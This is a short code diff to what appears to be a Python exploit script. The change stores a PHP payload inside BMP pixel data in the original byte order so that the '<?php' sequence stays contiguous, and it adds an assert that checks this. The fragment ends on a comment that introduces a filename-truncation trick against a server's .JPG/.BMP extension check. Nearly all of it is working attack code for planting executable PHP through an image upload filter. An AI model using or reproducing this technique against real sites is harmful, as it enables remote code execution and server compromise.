@@ -366,10 +366,11 @@ pixel_offset = struct.unpack_from('<I', data, 10)[0]
 padded = pad(payload)
 index = pixel_offset
 for c in chunk(padded, 3):
-    data[index + 2] = ord(c[0])  # R -> B in BMP format (BGR order)
-    data[index + 1] = ord(c[1])  # G stays
-    data[index] = ord(c[2])      # B -> R in BMP format
-    index += 4  # skip alpha byte (if 32-bit BMP) or use 3 for 24-bit
+    data[index] = ord(c[0])  # keep payload byte order so <?php survives as one run
+    data[index + 1] = ord(c[1])
+    data[index + 2] = ord(c[2])
+    index += 3  # 24-bit BMP: 3 bytes per pixel, no padding byte
+assert payload.encode() in bytes(data)  # payload must survive as one contiguous run
 
 # Filename truncation exploit:
 # Server checks extension: must end with .JPG or .BMP
